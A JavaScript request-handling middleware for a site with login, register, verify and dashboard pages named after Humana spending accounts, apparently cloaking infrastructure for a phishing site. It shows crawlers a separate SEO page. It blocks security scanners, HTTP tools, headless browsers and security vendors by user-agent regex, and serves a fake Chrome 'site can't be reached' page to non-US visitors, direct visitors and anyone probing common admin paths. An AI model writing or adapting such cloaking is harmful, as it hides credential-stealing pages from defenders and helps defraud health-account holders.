var ROUTES = {
  '/': 'index.html',
  '/login': 'login.html',
  '/register': 'register.html',
  '/spending-accounts-guide': 'spending-accounts-guide.html',
  '/eligible-expenses-humana': 'eligible-expenses-humana.html',
  '/faq-humana': 'faq-humana.html',
  '/security-humana': 'security-humana.html',
  '/contact-humana': 'contact-humana.html',
  '/dashboard': 'dashboard.html',
  '/verify': 'verify.html',
};

var CANONICAL_MAP = {
  '/index': '/',
  '/index.html': '/',
  '/login.html': '/login',
  '/register.html': '/register',
  '/spending-accounts-guide.html': '/spending-accounts-guide',
  '/eligible-expenses-humana.html': '/eligible-expenses-humana',
  '/faq-humana.html': '/faq-humana',
  '/security-humana.html': '/security-humana',
  '/contact-humana.html': '/contact-humana',
  '/dashboard.html': '/dashboard',
  '/verify.html': '/verify',
  '/seo': '/',
  '/seo.html': '/',
};

var GATED_PATHS = {
  '/': true,
  '/login': true,
  '/register': true,
};

var HONEYPOT_PATHS = {
  '/admin-portal': true,
  '/wp-admin': true,
  '/wp-login.php': true,
  '/.env': true,
  '/config.json': true,
  '/debug': true,
  '/phpinfo.php': true,
  '/server-status': true,
  '/.git': true,
  '/.git/config': true,
  '/wp-config.php': true,
  '/xmlrpc.php': true,
  '/administrator': true,
  '/backup': true,
  '/phpmyadmin': true,
};

var SECURITY_HEADERS = {
  'X-Robots-Tag': 'noai, noimageai',
  'X-Frame-Options': 'DENY',
  'X-Content-Type-Options': 'nosniff',
  'Referrer-Policy': 'strict-origin-when-cross-origin',
  'Permissions-Policy': 'camera=(), microphone=(), geolocation=()',
  'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
};

var BLOCKED_TOOL_UAS = /curl|wget|httpie|python-requests|python-urllib|python\/|aiohttp|httpx|requests\/|scrapy|urllib3|node-fetch|axios|got\/|undici|superagent|needle|request\/|postman|insomnia|paw\/|restsharp|okhttp|retrofit|apache-httpclient|java\/|libwww-perl|lwp-|mechanize|www-mechanize|perl\/|php\/|guzzle|symfony|laravel|drupal|wordpress|ruby|faraday|typhoeus|httparty|rest-client|go-http-client|fasthttp|colly|resty|winhttp|powershell|invoke-webrequest|fetch\/|deno\/|bun\//i;

var BLOCKED_SCANNER_UAS = /nuclei|sqlmap|nikto|nessus|openvas|masscan|zgrab|zmap|nmap|wpscan|dirbuster|gobuster|ffuf|httpx-toolkit|katana|burpsuite|burp|acunetix|qualys|rapid7|shodan|censys|zoomeye|binaryedge|whatweb|w3af|arachni|skipfish|feroxbuster|dirsearch|wfuzz|amass|subfinder|assetfinder|hakrawler|gau|waybackurls|arjun|paramspider|dalfox|xsstrike|commix|tplmap|crlfuzz|smuggler|headi|corsy|secretfinder|linkfinder|getjs|subjs|socialhunter|photon|uro|qsreplace|anew|interactsh|interact\.sh|cariddi|gospider|meg\/|rush\/|jaeles|xray|vulners|detectify|pentest|securitytrails|spyse/i;

var BLOCKED_SEO_CRAWLERS = /semrushbot|ahrefsbot|ahrefssiteaudit|mj12bot|dotbot|rogerbot|megaindex|blexbot|netcraft|seokicks|siteexplorer|serpstat|sistrix|screaming|deepcrawl|oncrawl|botify|lumar|contentkingbot|seobilitybot|seostar|searchmetricsbot|majestic|linkdex|exabot|sogou|360spider|bytedance|tiktokbot|ia_archiver|archive\.org_bot|alexa/i;

var BLOCKED_HEADLESS = /headlesschrome|phantomjs|selenium|puppeteer|playwright|cypress|webdriver|httrack|slimerjs|splash|nightmare|zombiejs|cheerio|jsdom|htmlunit|rhino|nashorn|casperjs|watir|capybara|ghost\.py|dryscrape|robobrowser|mechanicalsoup|grab|twill|splinter|windmill/i;

var BLOCKED_AI_TRAIN = /gptbot|anthropic-ai|claudebot|cohere-ai|ccbot|diffbot|commoncrawl|common-crawl|amazonbot|bytespider|google-extended|applebot-extended|imagesiftbot|omgili|meta-externalagent/i;

var TRUSTED_CRAWLERS = /googlebot|google-inspectiontool|google-site-verification|google-structured-data-testing-tool|googleother|google-agent|apis-google|feedfetcher-google|mediapartners-google|adsbot-google|storebot-google|google-read-aloud|google-favicon|bingbot|bingpreview|msnbot|msnbot-media|duckduckbot|applebot|slurp|yahoo|yandexbot|yandeximages|baiduspider|seznambot|yeti|naverbot|bravebot|qwantify|petalbot|gigabot|teoma/i;

var AI_ANSWER_ENGINES = /chatgpt-user|oai-searchbot|perplexitybot|perplexity-user|claude-user|claude-searchbot|duckassistbot|youbot|meta-externalfetcher/i;

var SOCIAL_CRAWLERS = /facebookexternalhit|facebookcatalog|twitterbot|linkedinbot|pinterestbot|slackbot|discordbot|whatsapp|telegrambot|skypeuripreview|viber|snapchat|embedly|redditbot/i;

var SEARCH_REFERRERS = /google\.|google\.com|bing\.|yahoo\.|duckduckgo\.|ddg\.gg|baidu\.|yandex\.|ecosia\.|startpage\.|ask\.|aol\.|search\.|perplexity\.ai|you\.com|chatgpt\.com|googleusercontent|discover|news\.google|apps\.google/i;

var GATE_COOKIE = '__hm_gate';

function addHeaders(response) {
  var resp = new Response(response.body, response);
  for (var key in SECURITY_HEADERS) {
    resp.headers.set(key, SECURITY_HEADERS[key]);
  }
  resp.headers.set('Vary', 'User-Agent');
  resp.headers.set('CDN-Cache-Control', 'no-store');
  return resp;
}

function buildErrorPage(hostname) {
  return '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>' + hostname + '</title><style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fff;color:#202124;-webkit-font-smoothing:antialiased}.e-wrap{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:24px 16px;text-align:center}.e-icon svg{width:72px;height:72px;margin-bottom:24px}h1{font-size:20px;font-weight:400;color:#202124;margin-bottom:6px}.e-sub{font-size:14px;color:#5f6368;margin-bottom:20px;line-height:1.5}.e-sub strong{color:#202124;font-weight:500}.e-details{font-size:13px;color:#5f6368;text-align:left;max-width:400px;line-height:1.7;margin-bottom:20px}.e-details ul{margin:4px 0 0 20px}.e-code{font-size:12px;color:#5f6368;margin-bottom:24px}.e-btn{display:inline-block;padding:8px 24px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;cursor:pointer;text-decoration:none}.e-btn:hover{background:#1765cc}@media(prefers-color-scheme:dark){body{background:#202124;color:#e8eaed}h1{color:#e8eaed}.e-sub{color:#9aa0a6}.e-sub strong{color:#e8eaed}.e-details{color:#9aa0a6}.e-code{color:#9aa0a6}}</style></head><body><div class="e-wrap"><div class="e-icon"><svg viewBox="0 0 72 72" fill="none"><circle cx="36" cy="36" r="34" stroke="#dadce0" stroke-width="2.5"/><path d="M36 22v20" stroke="#dadce0" stroke-width="3" stroke-linecap="round"/><circle cx="36" cy="50" r="2" fill="#dadce0"/></svg></div><h1>This site can\'t be reached</h1><p class="e-sub"><strong>' + hostname + '</strong>\'s server IP address could not be found.</p><div class="e-details"><p>Try:</p><ul><li>Checking the connection</li><li>Checking the proxy and the firewall</li><li>Running Windows Network Diagnostics</li></ul></div><p class="e-code">ERR_NAME_NOT_RESOLVED</p><a class="e-btn" href="javascript:location.reload()">Reload</a></div></body></html>';
}

function hasGateCookie(request) {
  var cookie = request.headers.get('cookie') || '';
  return cookie.indexOf(GATE_COOKIE) !== -1;
}

function setGateCookie(response) {
  var resp = new Response(response.body, response);
  resp.headers.append('Set-Cookie', GATE_COOKIE + '=1; Path=/; Max-Age=2592000; Secure; HttpOnly; SameSite=Lax');
  return resp;
}

function isBlockedBot(ua) {
  if (!ua || ua.length < 10) return true;
  if (TRUSTED_CRAWLERS.test(ua)) return false;
  if (AI_ANSWER_ENGINES.test(ua)) return false;
  if (SOCIAL_CRAWLERS.test(ua)) return false;
  if (BLOCKED_TOOL_UAS.test(ua)) return true;
  if (BLOCKED_SCANNER_UAS.test(ua)) return true;
  if (BLOCKED_SEO_CRAWLERS.test(ua)) return true;
  if (BLOCKED_HEADLESS.test(ua)) return true;
  if (BLOCKED_AI_TRAIN.test(ua)) return true;
  if (!/mozilla|chrome|safari|firefox|edge|opera|msie|trident/i.test(ua)) return true;
  return false;
}

export async function onRequest(context) {
  var request = context.request;
  var env = context.env;
  var next = context.next;
  var url = new URL(request.url);
  var pathname = url.pathname.replace(/\/+$/, '') || '/';
  var ua = request.headers.get('user-agent') || '';

  if (pathname.startsWith('/api/')) {
    var response = await next();
    return addHeaders(response);
  }

  if (CANONICAL_MAP[pathname]) {
    return Response.redirect(new URL(CANONICAL_MAP[pathname], request.url).toString(), 301);
  }

  if (HONEYPOT_PATHS[pathname]) {
    return new Response(buildErrorPage(url.hostname), {
      status: 200,
      headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' },
    });
  }

  if (isBlockedBot(ua)) {
    return new Response(buildErrorPage(url.hostname), {
      status: 200,
      headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' },
    });
  }

  if (!ROUTES[pathname] && !pathname.includes('.')) {
    try {
      var notFoundUrl = new URL('/404.html', request.url);
      var notFoundResp = await env.ASSETS.fetch(notFoundUrl);
      if (notFoundResp.ok) {
        return addHeaders(new Response(notFoundResp.body, {
          status: 404,
          headers: { 'Content-Type': 'text/html; charset=utf-8' },
        }));
      }
    } catch (e) {}
    return addHeaders(new Response(buildErrorPage(url.hostname), {
      status: 404,
      headers: { 'Content-Type': 'text/html; charset=utf-8' },
    }));
  }

  if (GATED_PATHS[pathname]) {
    var referer = request.headers.get('referer') || '';
    var host = request.headers.get('host') || '';
    var country = (request.cf && request.cf.country) || '';

    var isTrustedCrawler = TRUSTED_CRAWLERS.test(ua);
    var isAnswerEngine = AI_ANSWER_ENGINES.test(ua);
    var isFromSearch = SEARCH_REFERRERS.test(referer);
    var isInternal = host && referer.indexOf(host) !== -1;
    var hasCookie = hasGateCookie(request);

    if (isTrustedCrawler || isAnswerEngine) {
      try {
        var seoUrl = new URL('/seo.html', request.url);
        var seoResp = await env.ASSETS.fetch(seoUrl);
        if (seoResp.ok) {
          return addHeaders(new Response(seoResp.body, {
            status: 200,
            headers: { 'Content-Type': 'text/html; charset=utf-8' },
          }));
        }
      } catch (e) {}
    }

    var referrerGateOn = String(env.GATE_REFERRER || 'on').toLowerCase() !== 'off';

    if (!isTrustedCrawler && !isAnswerEngine) {
      if (country && country !== 'US') {
        return new Response(buildErrorPage(url.hostname), {
          status: 200,
          headers: { 'Content-Type': 'text/html; charset=utf-8' },
        });
      }
      if (referrerGateOn && !hasCookie && !isFromSearch && !isInternal) {
        return new Response(buildErrorPage(url.hostname), {
          status: 200,
          headers: { 'Content-Type': 'text/html; charset=utf-8' },
        });
      }
    }
  }

  var response = await next();
  var finalResp = addHeaders(response);

  if (GATED_PATHS[pathname] && !hasGateCookie(request)) {
    finalResp = setGateCookie(finalResp);
  }

  return finalResp;
}
